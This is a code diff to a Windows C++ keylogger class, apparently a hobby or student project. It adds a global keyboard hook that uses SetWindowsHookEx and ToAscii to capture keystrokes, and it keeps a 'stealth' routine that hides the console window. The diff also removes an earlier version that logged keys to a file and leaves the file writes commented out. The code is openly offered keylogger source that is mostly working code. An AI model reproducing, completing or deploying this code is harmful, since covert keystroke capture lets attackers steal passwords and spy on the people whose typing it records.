@@ -10,30 +10,28 @@
 
 #include "Keylog.hh"
 
+//static HHOOK hkb;
+
 Keylog::Keylog()
 {
 	mousePosX = 0;
 	mousePosY = 0;
 	keyPressed = 0;
-	myKeylogfile = fopen("MyFileKey", "a+");
 }
 
 Keylog::~Keylog()
 {
 }
 
-int		Keylog::getKey(INPUT_RECORD InRec)
+int		Keylog::getKey()
 {
-	std::cout << InRec.Event.KeyEvent.uChar.AsciiChar << std::endl;
-	if (InRec.Event.KeyEvent.uChar.AsciiChar == 'x')
-		return (1);
-	fprintf(myKeylogfile, &InRec.Event.KeyEvent.uChar.AsciiChar);
+
 	return (0);
 }
 
 int		Keylog::getMouse()
 {
-	std::cout << "Hello Mouse !" << std::endl;	
+	std::cout << "Hello Mouse !" << std::endl;
 	return (0);
 }
 
@@ -51,4 +49,51 @@ int		Keylog::stealth()
 	Stealth = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(Stealth, 0);
 	return (0);
+}
+
+
+LRESULT CALLBACK Keylog::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	char ch;
+
+	std::cout << "In keykey" << std::endl;
+	if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
+	{
+		std::cout << "In in keyboardproc" << std::endl;
+		if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || (wParam >= 0x2f) && (wParam <= 0x100))
+		{
+			if (wParam == VK_RETURN)
+			{
+				ch = '\n';
+				//fwrite(&ch, 1, 1, myKeylogfile);
+				std::cout << &ch << std::endl;
+			}
+			else
+			{
+				BYTE ks[256];
+				GetKeyboardState(ks);
+
+				WORD w;
+				UINT scan = 0;
+				ToAscii(wParam, scan, ks, &w, 0);
+				ch = char(w);
+				//fwrite(&ch, 1, 1, myKeylogfile);
+				std::cout << &ch << std::endl;
+			}
+			//fclose(myKeylogfile);
+		}
+	}
+
+	LRESULT RetVal = CallNextHookEx(0, nCode, wParam, lParam);
+	return  RetVal;
+}
+
+bool Keylog::installhook()
+{
+	//fclose(myKeylogfile);
+	std::cout << "- in installhook" << std::endl;
+	hkb = SetWindowsHookEx(WH_KEYBOARD, &KeyboardProc, NULL, 0);
+	std::cout << hkb << std::endl;
+	std::cout << "- out installhook" << std::endl;
+	return true;
 }
